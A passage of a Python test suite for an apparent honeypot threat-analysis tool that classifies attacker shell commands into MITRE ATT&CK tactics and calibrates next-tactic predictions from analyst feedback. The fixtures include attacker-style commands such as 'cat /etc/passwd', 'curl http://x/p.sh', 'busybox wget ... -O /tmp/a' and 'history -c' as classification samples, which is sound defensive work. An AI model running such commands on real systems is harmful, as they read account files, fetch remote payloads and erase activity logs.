        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        run_id = storage.save_prediction_backtest_run(
            {
                "schema_version": "prediction_backtest.v1",
                "generated_at": "2026-05-12T00:00:00+00:00",
                "metrics": {"top1_accuracy": 0.5},
            }
        )
        feedback_id = storage.record_analyst_feedback(
            {
                "session_id": "feedback-session",
                "snapshot_id": "snapshot-1",
                "label": "useful",
                "correct_next_tactic": "command-and-control",
                "observed_prefix": ["discovery", "credential-access"],
                "predicted_top_tactic": "command-and-control",
                "predicted_ranking": [{"tactic": "command-and-control", "score": 0.7}],
                "final_actual_next_tactic": "execution",
                "tactic_granularity": "tactic",
                "notes": "unit test feedback",
            }
        )

        backtests = storage.list_rows("prediction_backtest_runs")
        feedback = storage.list_rows("analyst_feedback")
        assert backtests[0]["run_id"] == run_id
        assert json.loads(backtests[0]["payload_json"])["metrics"]["top1_accuracy"] == 0.5
        assert feedback[0]["feedback_id"] == feedback_id
        assert feedback[0]["session_id"] == "feedback-session"
        assert feedback[0]["predicted_top_tactic"] == "command-and-control"
        assert feedback[0]["final_actual_next_tactic"] == "execution"
        assert feedback[0]["feedback_type"] == "operator_usefulness"
        assert feedback[0]["operator_signal"] == "useful"
        assert feedback[0]["weight_eligible"] in (0, False)
        assert json.loads(feedback[0]["payload_json"])["label"] == "useful"
        assert json.loads(feedback[0]["payload_json"])["label_authority"] == "sme_operator_usefulness"
        assert "credential-access" in json.loads(feedback[0]["payload_json"])["observed_prefix"]
        label_id = storage.record_classification_review_label(
            {
                "review_id": "review-1",
                "session_id": "feedback-session",
                "command_index": 0,
                "command": "cat /etc/passwd",
                "predicted_ttp": "T1003",
                "predicted_tactic": "credential-access",
                "predicted_source": "rule",
                "predicted_confidence": 1.0,
                "reviewed_ttp": "T1003",
                "reviewed_tactic": "credential-access",
                "reviewer": "unit",
            }
        )
        labels = storage.list_rows("classification_review_labels")
        assert labels[0]["label_id"] == label_id
        assert json.loads(labels[0]["payload_json"])["reviewed_tactic"] == "credential-access"


def test_calibration_worker_generates_bounded_overlay() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.calibration_policy = {
            **cfg.calibration_policy,
            "min_feedback_rows": 1,
            "min_backtest_cases": 1,
            "max_weight_step": 0.05,
            "output_path": str(Path(tmp) / "calibration_output.json"),
        }
        cfg.prediction_policy = {
            **cfg.prediction_policy,
            "weights": {
                "local_transition": 0.30,
                "fallback_progression": 0.10,
            },
        }
        storage = open_storage(cfg.database_url)
        storage.save_prediction_backtest_run(
            {
                "schema_version": "prediction_backtest.v1",
                "generated_at": "2026-05-12T00:00:00+00:00",
                "metrics": {"total_cases": 10},
                "accuracy_by_scorer_source": {
                    "local_transition": {"cases": 10, "top1_accuracy": 0.90},
                    "fallback_progression": {"cases": 10, "top1_accuracy": 0.10},
                },
            }
        )
        storage.record_analyst_feedback(
            {
                "session_id": "calibration-session",
                "feedback_type": "expert_review",
                "label": "useful",
                "predicted_top_tactic": "command-and-control",
                "final_actual_next_tactic": "command-and-control",
                "predicted_ranking": [
                    {
                        "tactic": "command-and-control",
                        "sources": [{"name": "local_transition"}],
                    }
                ],
            }
        )

        result = build_calibration_run(cfg, storage)
        assert result["status"] == "applied"
        assert result["applied"] is True
        assert result["calibrated_weights"]["local_transition"] == 0.35
        assert result["calibrated_weights"]["fallback_progression"] == 0.05
        assert result["adjustments"]["local_transition"]["delta"] == 0.05
        output_path = write_calibration_output(result, cfg.calibration_policy["output_path"])
        assert Path(output_path).exists()
        run_id = storage.save_prediction_calibration_run(result)
        rows = storage.list_rows("prediction_calibration_runs")
        assert rows[0]["run_id"] == run_id
        assert rows[0]["status"] == "applied"
        assert rows[0]["applied"] in (1, True)


def test_calibration_worker_counts_feedback_rows_not_scorer_sources() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.calibration_policy = {
            **cfg.calibration_policy,
            "min_feedback_rows": 2,
            "min_backtest_cases": 1,
            "max_weight_step": 0.05,
            "output_path": str(Path(tmp) / "calibration_output.json"),
        }
        cfg.prediction_policy = {
            **cfg.prediction_policy,
            "weights": {
                "local_transition": 0.30,
                "fallback_progression": 0.10,
            },
        }
        storage = open_storage(cfg.database_url)
        storage.save_prediction_backtest_run(
            {
                "schema_version": "prediction_backtest.v1",
                "generated_at": "2026-05-12T00:00:00+00:00",
                "metrics": {"total_cases": 10},
                "accuracy_by_scorer_source": {
                    "local_transition": {"cases": 10, "top1_accuracy": 0.90},
                    "fallback_progression": {"cases": 10, "top1_accuracy": 0.10},
                },
            }
        )
        storage.record_analyst_feedback(
            {
                "session_id": "calibration-session",
                "feedback_type": "expert_review",
                "label": "correct",
                "predicted_top_tactic": "command-and-control",
                "final_actual_next_tactic": "command-and-control",
                "predicted_ranking": [
                    {
                        "tactic": "command-and-control",
                        "sources": [
                            {"name": "local_transition"},
                            {"name": "fallback_progression"},
                        ],
                    }
                ],
            }
        )

        result = build_calibration_run(cfg, storage)
        assert result["status"] == "insufficient_data"
        assert result["applied"] is False
        assert result["inputs"]["feedback_cases"] == 1
        assert result["inputs"]["scorer_feedback_cases"] == 2
        assert "usable feedback rows 1 below threshold 2" in result["reason"]


def test_calibration_worker_hydrates_feedback_from_snapshot_id() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.calibration_policy = {
            **cfg.calibration_policy,
            "min_feedback_rows": 1,
            "min_backtest_cases": 1,
            "max_weight_step": 0.05,
            "output_path": str(Path(tmp) / "calibration_output.json"),
        }
        cfg.prediction_policy = {
            **cfg.prediction_policy,
            "weights": {
                "local_transition": 0.30,
                "fallback_progression": 0.10,
            },
        }
        storage = open_storage(cfg.database_url)
        storage.save_prediction_snapshot(
            {
                "snapshot_id": "snapshot-hydrate",
                "session_id": "calibration-session",
                "src_ip": "8.8.8.8",
                "session_status": "active",
                "event_id": "event-1",
                "features_hash": "feature-1",
                "generated_at": "2026-05-12T00:00:00+00:00",
                "final_ranking": [
                    {
                        "tactic": "command-and-control",
                        "score": 0.9,
                        "sources": [{"name": "local_transition"}],
                    }
                ],
            }
        )
        storage.save_prediction_backtest_run(
            {
                "schema_version": "prediction_backtest.v1",
                "generated_at": "2026-05-12T00:00:00+00:00",
                "metrics": {"total_cases": 10},
                "accuracy_by_scorer_source": {
                    "local_transition": {"cases": 10, "top1_accuracy": 0.90},
                    "fallback_progression": {"cases": 10, "top1_accuracy": 0.10},
                },
            }
        )
        storage.record_analyst_feedback(
            {
                "session_id": "calibration-session",
                "snapshot_id": "snapshot-hydrate",
                "feedback_type": "expert_review",
                "label": "correct",
                "final_actual_next_tactic": "command-and-control",
            }
        )

        result = build_calibration_run(cfg, storage)
        assert result["status"] == "applied"
        assert result["inputs"]["feedback_rows_hydrated_from_snapshots"] == 1
        assert result["inputs"]["feedback_cases"] == 1
        assert result["adjustments"]["local_transition"]["feedback_cases"] == 1


def test_controlled_auto_evidence_is_not_production_calibration_eligible_by_default() -> None:
    feedback = normalize_feedback_payload(
        {
            "session_id": "sme-auto-evidence-seed-001",
            "controlled_seed": True,
            "feedback_type": "auto_evidence",
            "predicted_top_tactic": "command-and-control",
            "final_actual_next_tactic": "command-and-control",
            "evidence_confidence": 1.0,
        }
    )
    assert feedback["evidence_origin"] == "controlled_test"
    assert feedback["weight_eligible"] is True

    usable, score, reason = feedback_weight_signal(feedback, {})
    assert usable is False
    assert score == 0.0
    assert "controlled_test" in reason


def test_controlled_test_session_prefix_is_not_production_calibration_eligible() -> None:
    feedback = normalize_feedback_payload(
        {
            "session_id": "controlled-test-auto-evidence-close-001",
            "feedback_type": "auto_evidence",
            "predicted_top_tactic": "execution",
            "final_actual_next_tactic": "command-and-control",
            "evidence_confidence": 1.0,
        }
    )
    assert feedback["evidence_origin"] == "controlled_test"
    assert feedback["weight_eligible"] is True

    usable, score, reason = feedback_weight_signal(feedback, {})
    assert usable is False
    assert score == 0.0
    assert "controlled_test" in reason


def test_live_auto_evidence_can_be_production_calibration_eligible() -> None:
    feedback = normalize_feedback_payload(
        {
            "session_id": "live-origin-session",
            "feedback_type": "auto_evidence",
            "evidence_origin": "live_cowrie",
            "predicted_top_tactic": "credential-access",
            "final_actual_next_tactic": "credential-access",
            "evidence_confidence": 0.95,
        }
    )
    assert feedback["evidence_origin"] == "live_cowrie"

    usable, score, reason = feedback_weight_signal(feedback, {})
    assert usable is True
    assert score == 1.0
    assert reason == "eligible evidence label"


def test_calibration_worker_excludes_controlled_test_rows_from_production_threshold() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.calibration_policy = {
            **cfg.calibration_policy,
            "min_feedback_rows": 1,
            "min_backtest_cases": 1,
            "auto_evidence_enabled": False,
        }
        cfg.prediction_policy = {
            **cfg.prediction_policy,
            "weights": {
                "local_transition": 0.30,
                "fallback_progression": 0.10,
            },
        }
        storage = open_storage(cfg.database_url)
        storage.save_prediction_backtest_run(
            {
                "schema_version": "prediction_backtest.v1",
                "generated_at": "2026-05-12T00:00:00+00:00",
                "metrics": {"total_cases": 10},
                "accuracy_by_scorer_source": {
                    "local_transition": {"cases": 10, "top1_accuracy": 0.90},
                    "fallback_progression": {"cases": 10, "top1_accuracy": 0.10},
                },
            }
        )
        storage.record_analyst_feedback(
            {
                "session_id": "sme-auto-evidence-seed-worker",
                "controlled_seed": True,
                "feedback_type": "auto_evidence",
                "predicted_top_tactic": "command-and-control",
                "final_actual_next_tactic": "command-and-control",
                "evidence_confidence": 1.0,
                "predicted_ranking": [
                    {
                        "tactic": "command-and-control",
                        "sources": [{"name": "local_transition"}],
                    }
                ],
            }
        )

        result = build_calibration_run(cfg, storage)
        assert result["status"] == "insufficient_data"
        assert result["inputs"]["feedback_origin_counts"]["controlled_test"] == 1
        assert result["inputs"]["usable_feedback_origin_counts"]["controlled_test"] == 0
        assert result["inputs"]["excluded_feedback_origin_counts"]["controlled_test"] == 1
        assert result["inputs"]["feedback_cases"] == 0
        assert "usable feedback rows 0 below threshold 1" in result["reason"]


def test_operator_feedback_remains_not_weight_eligible_even_with_live_origin() -> None:
    feedback = normalize_feedback_payload(
        {
            "session_id": "operator-live-origin-session",
            "feedback_type": "operator_usefulness",
            "evidence_origin": "live_cowrie",
            "operator_signal": "useful",
            "predicted_top_tactic": "command-and-control",
            "final_actual_next_tactic": "command-and-control",
        }
    )
    assert feedback["weight_eligible"] is False

    usable, score, reason = feedback_weight_signal(feedback, {})
    assert usable is False
    assert score == 0.0
    assert "operator_usefulness" in reason


def test_calibration_worker_ignores_operator_feedback_for_weights() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.calibration_policy = {
            **cfg.calibration_policy,
            "min_feedback_rows": 1,
            "min_backtest_cases": 1,
            "max_weight_step": 0.05,
            "auto_evidence_enabled": False,
        }
        cfg.prediction_policy = {
            **cfg.prediction_policy,
            "weights": {
                "local_transition": 0.30,
                "fallback_progression": 0.10,
            },
        }
        storage = open_storage(cfg.database_url)
        storage.save_prediction_backtest_run(
            {
                "schema_version": "prediction_backtest.v1",
                "generated_at": "2026-05-12T00:00:00+00:00",
                "metrics": {"total_cases": 10},
                "accuracy_by_scorer_source": {
                    "local_transition": {"cases": 10, "top1_accuracy": 0.90},
                    "fallback_progression": {"cases": 10, "top1_accuracy": 0.10},
                },
            }
        )
        storage.record_analyst_feedback(
            {
                "session_id": "operator-feedback-session",
                "feedback_type": "operator_usefulness",
                "operator_signal": "useful",
                "predicted_top_tactic": "command-and-control",
                "final_actual_next_tactic": "command-and-control",
                "predicted_ranking": [
                    {
                        "tactic": "command-and-control",
                        "sources": [{"name": "local_transition"}],
                    }
                ],
            }
        )
        storage.record_analyst_feedback(
            {
                "session_id": "operator-feedback-session",
                "feedback_type": "operator_action",
                "action_status": "done",
                "predicted_top_tactic": "command-and-control",
                "final_actual_next_tactic": "command-and-control",
                "predicted_ranking": [
                    {
                        "tactic": "command-and-control",
                        "sources": [{"name": "local_transition"}],
                    }
                ],
            }
        )

        result = build_calibration_run(cfg, storage)
        assert result["status"] == "insufficient_data"
        assert result["applied"] is False
        assert result["inputs"]["usable_feedback_rows"] == 0
        assert result["inputs"]["feedback_cases"] == 0
        assert result["adjustments"]["local_transition"]["feedback_cases"] == 0
        assert "usable feedback rows 0 below threshold 1" in result["reason"]


def test_calibration_worker_uses_high_confidence_auto_evidence_from_later_events() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.calibration_policy = {
            **cfg.calibration_policy,
            "min_feedback_rows": 1,
            "min_backtest_cases": 1,
            "max_weight_step": 0.05,
            "min_auto_evidence_confidence": 0.9,
            "auto_evidence_enabled": True,
        }
        cfg.prediction_policy = {
            **cfg.prediction_policy,
            "weights": {
                "local_transition": 0.30,
                "fallback_progression": 0.10,
            },
        }
        storage = open_storage(cfg.database_url)
        storage.save_session(
            {
                "session_id": "auto-evidence-session",
                "src_ip": "8.8.8.8",
                "session_source": "production_live",
                "start_time": "2026-05-12T00:00:00+00:00",
                "is_ended": True,
                "classification_events": [
                    {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0},
                    {"command": "curl http://x/p.sh", "ttp": "T1105", "tactic": "command-and-control", "source": "rule", "confidence": 1.0},
                ],
            }
        )
        storage.save_prediction_snapshot(
            {
                "snapshot_id": "auto-evidence-snapshot",
                "session_id": "auto-evidence-session",
                "src_ip": "8.8.8.8",
                "session_status": "active",
                "event_id": "event-1",
                "features_hash": "feature-auto",
                "generated_at": "2026-05-12T00:00:01+00:00",
                "features": {
                    "tactic_sequence": ["discovery"],
                    "classification_events": [
                        {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0},
                    ],
                },
                "final_ranking": [
                    {
                        "tactic": "command-and-control",
                        "score": 0.8,
                        "sources": [{"name": "local_transition"}],
                    }
                ],
            }
        )
        storage.save_prediction_backtest_run(
            {
                "schema_version": "prediction_backtest.v1",
                "generated_at": "2026-05-12T00:00:00+00:00",
                "metrics": {"total_cases": 10},
                "accuracy_by_scorer_source": {
                    "local_transition": {"cases": 10, "top1_accuracy": 0.90},
                    "fallback_progression": {"cases": 10, "top1_accuracy": 0.10},
                },
            }
        )

        result = build_calibration_run(cfg, storage)
        assert result["status"] == "applied"
        assert result["inputs"]["auto_evidence_rows_generated"] == 1
        assert result["inputs"]["feedback_origin_counts"]["live_cowrie"] == 1
        assert result["inputs"]["usable_feedback_origin_counts"]["live_cowrie"] == 1
        assert result["inputs"]["excluded_feedback_origin_counts"]["controlled_test"] == 0
        assert result["inputs"]["feedback_cases"] == 1
        assert result["adjustments"]["local_transition"]["feedback_cases"] == 1
        assert result["calibrated_weights"]["local_transition"] == 0.35


def test_session_worker_loads_calibration_output_overlay() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        output_path = Path(tmp) / "calibration_output.json"
        cfg.calibration_policy = {
            **cfg.calibration_policy,
            "enabled": True,
            "output_path": str(output_path),
            "apply_output": True,
        }
        cfg.prediction_policy = {
            **cfg.prediction_policy,
            "weights": {
                "local_transition": 0.30,
                "fallback_progression": 0.10,
            },
        }
        write_calibration_output(
            {
                "schema_version": "prediction_weight_calibration.v1",
                "run_id": "calibration-test-run",
                "generated_at": "2026-05-12T00:00:00+00:00",
                "status": "applied",
                "applied": True,
                "apply": True,
                "reason": "unit overlay",
                "inputs": {"feedback_cases": 200, "backtest_cases": 50},
                "policy_overlay": {"weights": {"local_transition": 0.35, "fallback_progression": 0.05}},
            },
            str(output_path),
        )
        worker = SessionWorker(cfg)
        assert worker.config.prediction_policy["weights"]["local_transition"] == 0.35
        assert worker.config.prediction_policy["weights"]["fallback_progression"] == 0.05
        assert worker.weight_calibration_status["status"] == "applied"
        assert worker.weight_calibration_status["run_id"] == "calibration-test-run"


def test_classification_evaluation_exports_imports_and_scores_review_labels() -> None:
    class FakeMitre:
        def get_tactics(self, tid):
            return {"T1003": ["credential-access"], "T1033": ["discovery"]}.get(tid, [])

        def get_name(self, tid):
            return tid

    classifier = NotebookParityClassifier(mitre_db=FakeMitre())
    payloads = [
        {
            "session_id": "class-eval",
            "src_ip": "8.8.8.8",
            "commands": ["whoami", "cat /etc/passwd"],
        }
    ]
    cases = collect_review_cases(payloads, classifier, limit=10)
    assert len(cases) == 2
    assert cases[0]["command_pattern"] == "discovery_basic"
    assert cases[1]["predicted_tactic"] == "credential-access"

    reviewed = [
        {**cases[0], "reviewed_ttp": "T1033", "reviewed_tactic": "discovery", "reviewer": "unit"},
        {**cases[1], "reviewed_ttp": "T1003", "reviewed_tactic": "credential-access", "reviewer": "unit"},
    ]
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        storage.initialize()
        imported = import_review_labels(storage, reviewed)
        assert imported["imported"] == 2
        metrics = classification_metrics(storage.list_classification_review_labels())
    assert metrics["reviewed_cases"] == 2
    assert metrics["tactic_accuracy"] == 1.0
    assert metrics["tactic_macro_f1"] == 1.0
    assert metrics["ttp_macro_f1"] == 1.0
    assert metrics["coverage"] == 1.0
    assert metrics["abstention_rate"] == 0.0
    assert metrics["by_command_pattern"]["credential_file"]["correct"] == 1


def test_classification_benchmark_supports_securebert_only_and_stratified_queue() -> None:
    class FakeMitre:
        @staticmethod
        def get_tactics(tid):
            return {"T1082": ["discovery"]}.get(tid, [])

        @staticmethod
        def get_name(tid):
            return tid

    securebert_only = NotebookParityClassifier(
        bert_fn=lambda _command: ("T1082", 0.91),
        mitre_db=FakeMitre(),
        rule_specs=[],
    )
    output = securebert_only.classify("customprobe --system")
    assert len(output) == 1
    assert output[0]["source"] == "securebert"
    assert output[0]["ttp"] == "T1082"

    records = [
        {"command": "curl http://a", "command_hash": "a", "reason": "low_confidence"},
        {"command": "wget http://b", "command_hash": "b", "reason": "disagreement"},
        {"command": "whoami", "command_hash": "c", "reason": "low_confidence"},
        {"command": "whoami", "command_hash": "duplicate", "reason": "duplicate"},
    ]
    first = prepare_queue(records, limit=3, seed=7)
    second = prepare_queue(records, limit=3, seed=7)
    assert first["cases"] == second["cases"]
    assert first["case_count"] == 3
    assert first["source_unique_commands"] == 3
    assert first["label_status"] == "unreviewed_not_ground_truth"
    assert all(item["review_status"] == "unreviewed" for item in first["cases"])


def test_opaque_securebert_busybox_probe_is_audit_only_without_blocking_real_busybox_tools() -> None:
    class FakeMitre:
        @staticmethod
        def get_tactics(tid):
            return {
                "T1036": ["defense-evasion"],
                "T1105": ["command-and-control"],
            }.get(tid, [])

        @staticmethod
        def get_name(tid):
            return tid

    classifier = NotebookParityClassifier(
        bert_fn=lambda _command: ("T1036", 0.99),
        mitre_db=FakeMitre(),
    )
    opaque = classifier.classify("/bin/busybox OYBVI")[0]
    assert opaque["source"] == "securebert"
    assert opaque["high_confidence"] is True
    assert is_trusted_classification_event(opaque) is False
    assert "opaque BusyBox applet probe" in classification_audit_reason(opaque)

    downloader = classifier.classify("busybox wget http://example.invalid/a -O /tmp/a")[0]
    assert downloader["ttp"] == "T1105"
    assert downloader["source"] == "rule_securebert_disagreement"
    assert is_trusted_classification_event(downloader) is False


def test_reviewed_discovery_rules_cover_audited_common_honeypot_commands() -> None:
    class FakeMitre:
        @staticmethod
        def get_tactics(tid):
            return {"T1033": ["discovery"], "T1082": ["discovery"], "T1083": ["discovery"]}.get(tid, [])

        @staticmethod
        def get_name(tid):
            return tid

    classifier = NotebookParityClassifier(bert_fn=None, mitre_db=FakeMitre())
    expected = {
        "uname": "T1082",
        "cat /proc/cpuinfo": "T1082",
        "cat /proc/mounts": "T1083",
        "which ls": "T1083",
        "w": "T1033",
    }
    for command, ttp in expected.items():
        events = classifier.classify(command)
        assert any(event.get("ttp") == ttp and event.get("source") == "rule" for event in events), command


def test_classification_consistency_benchmark_uses_set_labels_and_marks_selection_bias() -> None:
    review = {
        "review_type": "AI-assisted consistency review",
        "validation_status": "not independent ground truth",
        "classification_review": [
            {
                "command": "whoami",
                "recommended_ttps": ["T1033"],
                "system_mappings": [
                    {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0, "high_confidence": True}
                ],
            },
            {
                "command": "/bin/busybox OYBVI",
                "recommended_ttps": [],
                "system_mappings": [
                    {"command": "/bin/busybox OYBVI", "ttp": "T1036", "tactic": "defense-evasion", "source": "securebert", "confidence": 0.99, "high_confidence": True}
                ],
            },
        ],
    }
    queue = {
        "cases": [
            {"command": "whoami", "command_pattern": "discovery_basic", "classifier_outputs": []},
            {
                "command": "/bin/busybox OYBVI",
                "command_pattern": "other",
                "classifier_outputs": [
                    {"source": "securebert", "ttp": "T1036", "confidence": 0.99, "high_confidence": True}
                ],
            },
        ]
    }
    classifier = NotebookParityClassifier(
        bert_fn=None,
        rule_specs=[(r"\bwhoami\b", "T1033", "System Owner/User Discovery")],
    )
    result = evaluate_review_artifact(review, queue, classifier)
    assert result["case_count"] == 2
    assert "must not be reported as production classification accuracy" in result["selection_bias"]
    assert result["variants"]["captured_hybrid_raw"]["exact_technique_metrics"]["false_positive_labels"] == 1
    assert result["variants"]["captured_hybrid_trusted"]["exact_technique_metrics"]["false_positive_labels"] == 0
    assert result["variants"]["captured_hybrid_trusted"]["parent_technique_metrics"]["unknown_abstention_accuracy"] == 1.0


def test_classification_auto_validation_stores_weak_labels_without_manual_json_editing() -> None:
    class FakeMitre:
        def get_tactics(self, tid):
            return {"T1033": ["discovery"]}.get(tid, [])

        def get_name(self, tid):
            return tid

    payloads = [
        {
            "session_id": "auto-label-session",
            "src_ip": "203.0.113.10",
            "sensor": "sensor-a",
            "commands": ["whoami", "unknowncustomthing"],
            "classification_events": [
                {
                    "command": "whoami",
                    "ttp": "T1033",
                    "tactic": "discovery",
                    "source": "rule",
                    "confidence": 1.0,
                }
            ],
        }
    ]
    classifier = NotebookParityClassifier(bert_fn=None, mitre_db=FakeMitre())
    cases = collect_review_cases(payloads, classifier, limit=10)
    result = auto_validate_cases(cases, min_confidence=0.90)
    assert result["auto_accepted_count"] == 1
    assert result["needs_review_count"] == 1
    assert result["auto_accepted"][0]["reviewed_ttp"] == "T1033"
    assert result["auto_accepted"][0]["reviewer"] == "auto_confidence_consensus_v1"
    assert result["needs_review"][0]["validation_status"] == "needs_review"

    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        storage.initialize()
        imported = import_review_labels(storage, result["auto_accepted"])
        assert imported["imported"] == 1
        metrics = classification_metrics(storage.list_classification_review_labels())
    assert metrics["reviewed_cases"] == 1
    assert metrics["weak_labeled_cases"] == 1
    assert metrics["human_reviewed_cases"] == 0
    assert metrics["validation_sources"]["auto_rule_high_confidence"] == 1


def test_classification_auto_validation_accepts_tactic_level_agreement() -> None:
    cases = [
        {
            "review_id": "tactic-agree",
            "session_id": "class-tactic-agree",
            "command": "history -c",
            "predicted_ttp": "T1070",
            "predicted_tactic": "defense-evasion",
            "predicted_source": "both",
            "predicted_confidence": 1.0,
            "classifier_outputs": [
                {
                    "command": "history -c",
                    "ttp": "T1070",
                    "tactic": "defense-evasion",
                    "source": "both",
                    "confidence": 1.0,
                    "bert_ttp": "T1562",
                    "bert_tactic": "defense-evasion",
                    "bert_confidence": 0.96,
                }
            ],
        }
    ]
    result = auto_validate_cases(cases, min_confidence=0.90)
    assert result["auto_accepted_count"] == 1
    accepted = result["auto_accepted"][0]
    assert accepted["validation_source"] == "auto_rule_securebert_tactic_consensus"
    assert accepted["validation_strength"] == "tactic_only_weak_label"
    assert accepted["technique_review_required"] is True


def test_monitor_records_and_renders_analyst_feedback() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        storage.save_session(
            {
                "session_id": "feedback-ui-session",
                "src_ip": "8.8.8.8",
                "status": "active",
                "commands": ["whoami"],
            }
        )
        storage.save_prediction_snapshot(
            {
                "snapshot_id": "feedback-ui-snapshot",
                "session_id": "feedback-ui-session",
                "src_ip": "8.8.8.8",
                "session_status": "active",
                "event_id": "evt-feedback",
                "features_hash": "features-feedback",
                "generated_at": "2026-05-12T00:00:00+00:00",
                "prediction": ["discovery"],
                "features": {"tactic_sequence": ["discovery"]},
                "final_ranking": [{"tactic": "discovery", "score": 0.5, "confidence": "low"}],
            }
        )
        db_path = str(Path(tmp) / "state.db")
        monitor_cfg = MonitorConfig(db_path=db_path, reports_dir=str(Path(tmp) / "reports"))
        feedback_id = record_analyst_feedback(
            monitor_cfg,
            {
                "session_id": "feedback-ui-session",
                "snapshot_id": "feedback-ui-snapshot",
                "label": "useful",
                "correct_next_tactic": "discovery",
                "observed_prefix": "[\"discovery\"]",
                "predicted_top_tactic": "discovery",
                "predicted_ranking": "[{\"tactic\":\"discovery\"}]",
                "final_actual_next_tactic": "execution",
                "notes": "unit test feedback",
            },
        )
        detail = load_session_detail(monitor_cfg, "feedback-ui-session")
        html = _render_feedback_panel(detail)
        assert feedback_id
        assert "Useful" in html
        assert "Done" in html
        assert "unit test feedback" in html
        assert "Correct next tactic" not in html
        assert detail["analyst_feedback"][0]["label"] == "useful"
        assert detail["analyst_feedback"][0]["feedback_type"] == "operator_usefulness"
        assert detail["analyst_feedback"][0]["operator_signal"] == "useful"
        assert detail["analyst_feedback"][0]["weight_eligible"] in (0, False)
        assert detail["analyst_feedback"][0]["predicted_top_tactic"] == "discovery"


def test_feedback_review_identifies_high_confidence_wrong_and_low_confidence_useful() -> None:
    rows = [
        {
            "session_id": "fb-1",
            "label": "wrong",
            "predicted_top_tactic": "persistence",
            "final_actual_next_tactic": "command-and-control",
            "predicted_ranking": json.dumps(
                [
                    {
                        "tactic": "persistence",
                        "score": 0.8,
                        "confidence": "high",
                        "source_types": ["heuristic_prior"],
                        "sources": [{"name": "fallback_progression", "source_type": "heuristic_prior"}],
                    }
                ]
            ),
        },
        {
            "session_id": "fb-2",
            "label": "useful",
            "predicted_top_tactic": "discovery",
            "final_actual_next_tactic": "discovery",
            "predicted_ranking": json.dumps([{"tactic": "discovery", "score": 0.2, "confidence": "low"}]),
        },
    ]
    review = build_feedback_review(rows)
    assert review["feedback_count"] == 2
    assert review["label_counts"]["wrong"] == 1
    assert review["high_confidence_wrong"][0]["session_id"] == "fb-1"
    assert review["low_confidence_useful"][0]["session_id"] == "fb-2"
    assert review["recurring_weak_predictions"][0]["tactic"] == "persistence"
    assert review["failure_categories"]["calibration_or_weighting_review"] == 1
    assert review["weak_scorer_sources"]["fallback_progression"] == 1
    assert filter_feedback_rows(rows, "policy_review")[0]["session_id"] == "fb-1"
    assert filter_feedback_rows(rows, "low_confidence_useful")[0]["session_id"] == "fb-2"


def test_monitor_renders_feedback_review_filters() -> None:
    rows = [
        {
            "session_id": "fb-filter-1",
            "label": "wrong",
            "predicted_top_tactic": "persistence",
            "final_actual_next_tactic": "execution",
            "predicted_ranking": json.dumps(
                [
                    {
                        "tactic": "persistence",
                        "score": 0.82,
                        "confidence": "high",
                        "source_types": ["heuristic_prior"],
                        "sources": [{"name": "fallback_progression", "source_type": "heuristic_prior"}],
                    }
                ]
            ),
            "notes": "policy rule looks wrong",
        }
    ]
    html = _render_feedback_review_panel(
        {
            "evidence": {
                "feedback_review": build_feedback_review(rows),
                "feedback_rows": rows,
                "errors": {},
            }
        },
        "fb-filter-1",
        "high_confidence_wrong",
    )
    assert "Feedback Review Recommendations" in html
    assert "High-conf wrong" in html
    assert "fb-filter-1" in html
    assert "policy_rule_review" in html


def test_monitor_renders_prediction_evidence_status() -> None:
    html = _render_prediction_evidence(
        {
            "evidence": {
                "backtest": {
                    "generated_at": "2026-05-20T00:00:00+00:00",
                    "total_cases": 31,
                    "top1_accuracy": 0.29,
                    "top3_accuracy": 0.61,
                    "mrr": 0.42,
                    "disagreement_rate": 1.0,
                    "low_bucket_cases": 31,
                    "medium_bucket_cases": 0,
                    "high_bucket_cases": 0,
                },
                "feedback": {
                    "count": 2,
                    "labels": {"wrong": 1, "useful": 1},
                    "high_confidence_wrong": 1,
                    "low_confidence_useful": 1,
                },
                "classification_review": {
                    "reviewed_cases": 2,
                    "tactic_accuracy": 1.0,
                    "ttp_accuracy": 1.0,
                    "source_counts": {"rule": 2},
                },
                "errors": {},
            }
        }
    )
    assert "latest backtest" in html
    assert "top-1 / top-3" in html
    assert "wrong:1" in html
    assert "rule:2" in html
    assert "Backtest sample size is below" in html


def test_monitor_highlights_classification_quality_in_prediction_panel() -> None:
    html = _render_prediction_panel(
        {
            "ok": True,
            "latest_prediction_snapshot": {
                "snapshot_id": "quality-snapshot",
                "payload": {
                    "snapshot_id": "quality-snapshot",
                    "session_id": "quality-session",
                    "engine": {"name": "realtime_prediction", "version": "1.0"},
                    "session_status": "active",
                    "features": {
                        "observed_tactics": ["discovery"],
                        "last_tactic": "discovery",
                        "classification_chain_confidence_geomean": 0.44,
                        "commands": ["unknowncustomthing"],
                        "classification_events": [
                            {
                                "command": "unknowncustomthing",
                                "ttp": None,
                                "tactic": "unknown",
                                "source": "securebert_low_confidence",
                                "confidence": 0.44,
                            }
                        ],
                    },
                    "coverage": {"active_scorer_count": 1, "min_active_scorers": 2, "reason": "insufficient scorer coverage"},
                    "model_maturity": {"maturity": "cold", "warning": "Prediction is prior-dominated; treat confidence as low."},
                    "classification_quality": {
                        "event_count": 1,
                        "validation_status": "unvalidated",
                        "unknown_count": 1,
                        "shell_noise_count": 0,
                        "confidence_min": 0.44,
                        "confidence_geomean": 0.44,
                        "source_counts": {"securebert_low_confidence": 1},
                    },
                    "calibration_status": {"status": "disabled"},
                    "trust_status": {"status": "review_required", "warnings": []},
                    "agreement": {},
